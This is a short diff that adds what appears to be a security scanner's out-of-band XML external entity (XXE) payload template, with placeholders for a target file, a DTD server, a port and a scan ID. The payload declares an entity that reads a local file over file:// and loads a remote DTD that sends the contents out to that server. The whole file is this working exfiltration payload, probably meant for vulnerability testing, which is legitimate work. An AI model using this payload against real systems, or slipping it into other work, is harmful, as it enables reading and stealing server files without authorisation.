@@ -1,0 +1,9 @@
+X-Requested-With: XMLHttpRequest
+
+<!DOCTYPE roottag [
+<!ENTITY % exfiltrate_data SYSTEM "file://$exfiltrate_filename">
+<!ENTITY % dtd SYSTEM "http://$dtd_server:$dtd_port/?scan_id=$scan_id">
+%dtd;
+%send;
+]>
+<roottag>&myall;</roottag>
